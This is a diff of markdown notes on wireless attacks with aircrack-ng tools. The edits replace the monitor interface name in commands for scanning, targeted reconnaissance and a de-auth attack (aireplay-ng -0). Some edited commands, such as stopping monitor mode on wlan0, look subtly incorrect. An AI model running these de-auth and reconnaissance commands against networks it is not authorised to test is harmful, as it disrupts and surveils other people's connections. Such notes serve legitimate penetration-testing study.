@@ -38,7 +38,7 @@ iwconfig
 
 ## Set wireless adapter back in managed mode
 ```bash
-sudo airmon-ng stop wlanmon
+sudo airmon-ng stop wlan0
 ```
 
 ```bash
@@ -52,17 +52,17 @@ sudo systemctl start NetworkManager
 ## Scan
 
 ```bash
-sudo airodump-ng wlan0mon 
+sudo airodump-ng wlan0
 ```
 By default it will scan only in 2.4Ghz
 
 ```bash
-airodump-ng wlan0mon --manufacturer
+airodump-ng wlan0 --manufacturer
 ```
 Gives you a bit more information
 
 ```bash
-airodump-ng wlan0mon --manufacturer --band abg
+airodump-ng wlan0 --manufacturer --band abg
 ```
 Scan in different bands
 
@@ -70,12 +70,12 @@ Scan in different bands
 
 ### reconnaissance
 ```bash
-sudo airodump-ng --bssid <bssid> --channel <CH-number> wlan0mon
+sudo airodump-ng --bssid <bssid> --channel <CH-number> wlan0
 ```
 
 ### De-auth attack
 ```bash
-sudo aireplay-ng -0 30 -a <client-mac-address> wlan0mon
+sudo aireplay-ng -0 30 -a <client-mac-address> wlan0
 ```
 
 ### Wifite
